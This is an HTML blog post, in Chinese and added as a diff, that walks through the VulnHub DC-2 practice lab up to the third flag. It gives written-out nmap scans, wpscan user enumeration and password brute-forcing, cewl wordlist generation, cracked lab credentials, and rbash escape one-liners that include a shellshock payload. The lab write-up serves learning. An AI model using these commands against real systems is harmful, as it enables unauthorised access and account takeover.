@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>VulnHub_DC-2靶机渗透测试学习 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub_DC-2靶机渗透测试学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-06-22&nbsp;&nbsp;21:01:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 这个靶机是 <a href="https://twitter.com/@DCAU7" target="_blank" rel="noopener">@DCAU7</a> 出品的系列靶机<a href="https://www.vulnhub.com/series/dc,199/" target="_blank" rel="noopener">DC</a>中的第二个<a href="https://www.vulnhub.com/entry/dc-2,311/" target="_blank" rel="noopener">DC-2</a>。</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/1.png" alt="1"></p>
+<p>这个靶机也有5个flag需要去找。而且给了提示，需要在hosts文件中添加一条记录，将域名和ip地址绑定在一起。</p>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>老生常谈了，先用<code>nmap</code>扫一下目标主机的ip：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -sP 192.168.247.1/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 23:06 EDT</span><br><span class="line">Nmap scan report for 192.168.247.1</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Nmap scan report for 192.168.247.2</span><br><span class="line">Host is up (0.00059s latency).</span><br><span class="line">Nmap scan report for 192.168.247.210</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Nmap scan report for 192.168.247.215</span><br><span class="line">Host is up (0.0030s latency).</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.66 seconds</span><br></pre></td></tr></table></figure>
+
+<p>确定目标主机的ip为<code>192.168.247.215</code>，再扫描，收集目标主机开启的服务信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -p1-65535 -A 192.168.247.215 -oN /tmp/DC-2.txt</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 23:10 EDT</span><br><span class="line">Nmap scan report for 192.168.247.215</span><br><span class="line">Host is up (0.00069s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.82 seconds</span><br></pre></td></tr></table></figure>
+
+<p>目标主机上有一个站点，并且开启了ssh服务，注意端口是<code>7744</code>，而不是常见的<code>22</code>，接下来需要访问该站点寻找突破口。</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>打开浏览器访问<code>http://192.168.247.215</code>，跳转到了<code>http://dc-2</code>：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/2.png" alt="2"></p>
+<p>这个在一开始靶机制作者就已经给出了提示，需要在攻击机的hosts文件中添加一条记录，将域名和真实的ip绑定，不然无法解析。</p>
+<p>该文件为<code>/etc/hosts</code>，添加一条记录<code>192.168.247.215 dc-2</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ cat /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       kali</span><br><span class="line">192.168.247.215 dc-2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The following lines are desirable <span class="keyword">for</span> IPv6 capable hosts</span></span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>
+
+<p>修改之后重启网络服务使之生效：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo service networking restart</span><br></pre></td></tr></table></figure>
+
+<p>重新访问<code>http://dc-2</code>，已经能看到正常网页了：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/3.png" alt="3"></p>
+<p>网页上写着<code>Just another WordPress site</code>，说这是一个WordPress站点。还看到<code>flag1</code>：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/4.png" alt="4"></p>
+<p>根据flag1的提示，接下来我们需要先登录后台，所以先用<code>Dirbuster</code>扫描一下登录的入口：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/5.png" alt="5"></p>
+<p>后台登录入口为<code>wp-login.php</code>：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/6.png" alt="6"></p>
+<p>我尝试了最常见的密码<code>admin : 123456</code>和<code>admin : admin</code>，但是都不太对。</p>
+<h3 id="wordpress用户探测"><a href="#wordpress用户探测" class="headerlink" title="wordpress用户探测"></a>wordpress用户探测</h3><p>这个时候就需要一款能够扫描已经安装的WordPress已知安全漏洞的神器——<strong>wpscan</strong>。</p>
+<p><code>wpscan -h</code>就能看到使用选项：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ wpscan --help</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.1</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">Usage: wpscan [options]</span><br><span class="line">        --url URL                                 The URL of the blog to scan</span><br><span class="line">                                                  Allowed Protocols: http, https</span><br><span class="line">                                                  Default Protocol if none provided: http</span><br><span class="line">                                                  This option is mandatory unless update or help or hh or version is/are supplied</span><br><span class="line">        --version                                 Display the version and exit</span><br><span class="line">    -t, --max-threads VALUE                       The max threads to use</span><br><span class="line">    -e, --enumerate [OPTS]                        Enumeration Process</span><br><span class="line">                                                  Available Choices:</span><br><span class="line">                                                   vp   Vulnerable plugins</span><br><span class="line">                                                   ap   All plugins</span><br><span class="line">                                                   p    Popular plugins</span><br><span class="line">                                                   vt   Vulnerable themes</span><br><span class="line">                                                   at   All themes</span><br><span class="line">                                                   t    Popular themes</span><br><span class="line">                                                   tt   Timthumbs</span><br><span class="line">                                                   cb   Config backups</span><br><span class="line">                                                   dbe  Db exports</span><br><span class="line">                                                   u    User IDs range. e.g: u1-5</span><br><span class="line">                                                        Range separator to use: '-'</span><br><span class="line">                                                        Value if no argument supplied: 1-10</span><br><span class="line">                                                   m    Media IDs range. e.g m1-15</span><br><span class="line">                                                        Note: Permalink setting must be set to "Plain" for those to be detected</span><br><span class="line">                                                        Range separator to use: '-'</span><br><span class="line">                                                        Value if no argument supplied: 1-100</span><br><span class="line">                                                  Separator to use between the values: ','</span><br><span class="line">                                                  Default: All Plugins, Config Backups</span><br><span class="line">                                                  Value if no argument supplied: vp,vt,tt,cb,dbe,u,m</span><br><span class="line">                                                  Incompatible choices (only one of each group/s can be used):</span><br><span class="line">                                                   - vp, ap, p</span><br><span class="line">                                                   - vt, at, t</span><br><span class="line">        --plugins-detection MODE                  Use the supplied mode to enumerate Plugins.</span><br><span class="line">                                                  Default: passive</span><br><span class="line">                                                  Available choices: mixed, passive, aggressive</span><br><span class="line">        --plugins-version-detection MODE          Use the supplied mode to check plugins' versions.</span><br><span class="line">                                                  Default: mixed</span><br><span class="line">                                                  Available choices: mixed, passive, aggressive</span><br><span class="line">    -P, --passwords FILE-PATH                     List of passwords to use during the password attack.</span><br><span class="line">                                                  If no --username/s option supplied, user enumeration will be run.</span><br><span class="line">    -U, --usernames LIST                          List of usernames to use during the password attack.</span><br><span class="line">                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'</span><br><span class="line">        --multicall-max-passwords MAX_PWD         Maximum number of passwords to send by request with XMLRPC multicall</span><br><span class="line">                                                  Default: 500</span><br><span class="line">        --password-attack ATTACK                  Force the supplied attack to be used rather than automatically determining one.</span><br><span class="line">                                                  Available choices: wp-login, xmlrpc, xmlrpc-multicall</span><br><span class="line">        --stealthy                                Alias for --random-user-agent --detection-mode passive --plugins-version-detection passive</span><br><span class="line"></span><br><span class="line">[!] To see full list of options use --hh.</span><br></pre></td></tr></table></figure>
+
+<p><code>wpscan</code>能过先对站点进行粗略的扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wpscan --url http://dc-2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/7.png" alt="7"></p>
+<p>得到3个信息：</p>
+<ol>
+<li>wordpress版本为4.7.10；</li>
+<li>没有安装插件；</li>
+<li>没有config backup文件。</li>
+</ol>
+<p>我本来是想看根据wordpress的版本搜索有没有什么知名的漏洞可以利用，最好是rce漏洞，但是并没有找到什么合适的未授权漏洞可以利用。</p>
+<p>所以接下来还是先利用wpscan枚举一下站点用户，看看能不能爆破出用户的账号：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wpscan --url http://dc-2 -e u</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/8.png" alt="8"></p>
+<p>发现三个用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">jerry</span><br><span class="line">tom</span><br></pre></td></tr></table></figure>
+
+<p>然后将这三个用户信息保存在文件<code>users.txt</code>中：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ cat users.txt </span><br><span class="line">admin</span><br><span class="line">jerry</span><br><span class="line">tom</span><br></pre></td></tr></table></figure>
+
+<p>对这些用户名进行爆破，这个字典我用的是比较大的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wpscan --url http://dc-2 --passwords /usr/share/dirb/wordlists/big.txt --usernames users.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>这个需要的时间有点久，跑了很久，在最后跑到<code>admin</code>密码的时候出bug停止了，我就没再浪费时间重新测试了：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/16.png" alt="16"></p>
+<p>flag1给的提示是用kali中自带的密码字典生成工具<code>cewl</code>来生成密码字典。<code>cewl</code>是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。 </p>
+<p><code>cewl</code>的使用选项为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ cewl -h</span><br><span class="line">CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">Usage: cewl [OPTIONS] ... &lt;url&gt;</span><br><span class="line"></span><br><span class="line">    OPTIONS:</span><br><span class="line">        -h, --help: Show help.</span><br><span class="line">        -k, --keep: Keep the downloaded file.</span><br><span class="line">        -d &lt;x&gt;,--depth &lt;x&gt;: Depth to spider to, default 2.</span><br><span class="line">        -m, --min_word_length: Minimum word length, default 3.</span><br><span class="line">        -o, --offsite: Let the spider visit other sites.</span><br><span class="line">        --exclude: A file containing a list of paths to exclude</span><br><span class="line">        --allowed: A regex pattern that path must match to be followed</span><br><span class="line">        -w, --write: Write the output to the file.</span><br><span class="line">        -u, --ua &lt;agent&gt;: User agent to send.</span><br><span class="line">        -n, --no-words: Don't output the wordlist.</span><br><span class="line">        --lowercase: Lowercase all parsed words</span><br><span class="line">        --with-numbers: Accept words with numbers in as well as just letters</span><br><span class="line">        --convert-umlauts: Convert common ISO-8859-1 (Latin-1) umlauts (ä-ae, ö-oe, ü-ue, ß-ss)</span><br><span class="line">        -a, --meta: include meta data.</span><br><span class="line">        --meta_file file: Output file for meta data.</span><br><span class="line">        -e, --email: Include email addresses.</span><br><span class="line">        --email_file &lt;file&gt;: Output file for email addresses.</span><br><span class="line">        --meta-temp-dir &lt;dir&gt;: The temporary directory used by exiftool when parsing files, default /tmp.</span><br><span class="line">        -c, --count: Show the count for each word found.</span><br><span class="line">        -v, --verbose: Verbose.</span><br><span class="line">        --debug: Extra debug information.</span><br><span class="line"></span><br><span class="line">        Authentication</span><br><span class="line">        --auth_type: Digest or basic.</span><br><span class="line">        --auth_user: Authentication username.</span><br><span class="line">        --auth_pass: Authentication password.</span><br><span class="line"></span><br><span class="line">        Proxy Support</span><br><span class="line">        --proxy_host: Proxy host.</span><br><span class="line">        --proxy_port: Proxy port, default 8080.</span><br><span class="line">        --proxy_username: Username for proxy, if required.</span><br><span class="line">        --proxy_password: Password for proxy, if required.</span><br><span class="line"></span><br><span class="line">        Headers</span><br><span class="line">        --header, -H: In format name:value - can pass multiple.</span><br><span class="line"></span><br><span class="line">    &lt;url&gt;: The site to spider.</span><br></pre></td></tr></table></figure>
+
+<p><code>-w</code>将文件保存到指定路径：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w passwords.txt http://dc-2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/9.png" alt="9"></p>
+<p>利用<code>cewl</code>能很快得到密码：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/10.png" alt="10"></p>
+<p>但是只爆出了用户<code>jerry</code>和<code>tom</code>的密码，admin的密码可能太过复杂：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
+
+<p>登录<code>jerry</code>的账号，发现了<code>flag2</code>：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/11.png" alt="11"></p>
+<p>flag2给出的提示是如果我们不能通过这个wordpress站点作为攻击目标主机的入口，要想其他的办法：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/12.png" alt="12"></p>
+<p>提示是找另外的入口，之前用nmap扫描，知道目标服务器上还开启了ssh，服务端口是<code>7744</code>。但是账户密码信息并不知道，但是现在有两个用户信息是可以尝试一下的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
+
+<p>jerry登录失败，但是用户tom是能够成功登录的！</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/13.png" alt="13"></p>
+<h3 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h3><p>但是当前用户的bash却是<code>rbash</code>：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/14.png" alt="14"></p>
+<p>什么是<code>rbash</code>呢？</p>
+<blockquote>
+<p><strong>rbash</strong></p>
+<p>rbash即<code>restricted bash</code>，也就是<strong>受限制的bash</strong>。rbash只是bash的一个软链接，用于中专服务器，限制用户使用其他的命令。</p>
+<p>除了下面几点以外，rbash和正常的bash没什么其他的区别：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* changing directories with cd (不能更改目录)</span><br><span class="line">* setting or unsetting the values of SHELL, PATH, ENV, or BASH_ENV (不能设置或者取消环境变量)</span><br><span class="line">* specifying command names containing &#x2F; (命令中不能包含&#x2F;符号)</span><br><span class="line">* specifying a file name containing a &#x2F; as an argument to the . builtin command (文件操作命令中不能包含&#x2F;符号)</span><br><span class="line">* Specifying a filename containing a slash as an argument to the -p option to the hash builtin command (文件操作命令中不能包含-符号)</span><br><span class="line">* importing function definitions from the shell environment at startup</span><br><span class="line">* parsing the value of SHELLOPTS from the shell environment at startup</span><br><span class="line">* redirecting output using the &gt;, &gt;|, &lt;&gt;, &gt;&amp;, &amp;&gt;, and &gt;&gt; redirection operators (不能使用 &gt;, &gt;|, &lt;&gt;, &gt;&amp;, &amp;&gt;, and &gt;&gt;等重定向操作符号)</span><br><span class="line">* using the exec builtin command to replace the shell with another command</span><br><span class="line">* adding or deleting builtin commands with the -f and -d options to the enable builtin command</span><br><span class="line">* Using the enable builtin command to enable disabled shell builtins</span><br><span class="line">* specifying the -p option to the command builtin command</span><br><span class="line">* turning off restricted mode with set +r or set +o restricted. (不能使用set +r或是set +o关闭)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>因为rbash的存在，虽然登录了目标服务器，但是什么事情都做不了。</p>
+<p>所以接下去我们需要绕过rbash的限制，具体的可以参考这两篇文章，写得很具体：</p>
+<blockquote>
+<ol>
+<li><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/188989.html</a> </li>
+<li><a href="https://xz.aliyun.com/t/7642" target="_blank" rel="noopener">https://xz.aliyun.com/t/7642</a> </li>
+</ol>
+</blockquote>
+<h4 id="1-ssh登录时逃逸"><a href="#1-ssh登录时逃逸" class="headerlink" title="1. ssh登录时逃逸"></a>1. ssh登录时逃逸</h4><p>我先尝试了在登录ssh时绕过，具体的做法参考第2篇先知社区的文章：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh username@IP -t &quot;&#x2F;bin&#x2F;sh&quot; or &quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">ssh username@IP -t &quot;() &#123; :; &#125;; &#x2F;bin&#x2F;bash&quot;   ###shellshock</span><br></pre></td></tr></table></figure>
+
+<p>但是因为命令中包含<code>/</code>字符和<code>bash</code>命令被禁止而没有成功：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ ssh tom@192.168.247.215 -p 7744 "/bin/bash"</span><br><span class="line">tom@192.168.247.215's password: </span><br><span class="line">rbash: /bin/bash: restricted: cannot specify `/' in command names</span><br><span class="line">kali@kali:~$ ssh tom@192.168.247.215 -p 7744 "bash --noprofile"</span><br><span class="line">tom@192.168.247.215's password: </span><br><span class="line">rbash: bash: command not found</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-检查可用命令"><a href="#2-检查可用命令" class="headerlink" title="2. 检查可用命令"></a>2. 检查可用命令</h4><p>查看可以用的命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ cd</span><br><span class="line">-rbash: cd: restricted</span><br><span class="line">tom@DC-2:~$ cp</span><br><span class="line">-rbash: cp: command not found</span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>ls</code>是可以使用的，并且在当前目录下发现了第3个flag文件<code>flag3.txt</code>，尝试读取它失败了，因为<code>cat</code>命令也是不被允许的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">-rbash: cat: command not found</span><br></pre></td></tr></table></figure>
+
+<p>读取文件的命令还有很多，比如<code>less</code>，<code>more</code>，<code>tail</code>，最后发现<code>less</code>命令是可以被成功执行的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ more flag3.txt</span><br><span class="line">-rbash: more: command not found</span><br><span class="line">tom@DC-2:~$ less flag3.txt</span><br></pre></td></tr></table></figure>
+
+<p>不仅<code>less</code>命令，<code>vi</code>命令也是可以被执行的，读取到的<code>flag3.txt</code>内容为：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/15.png" alt="15"></p>
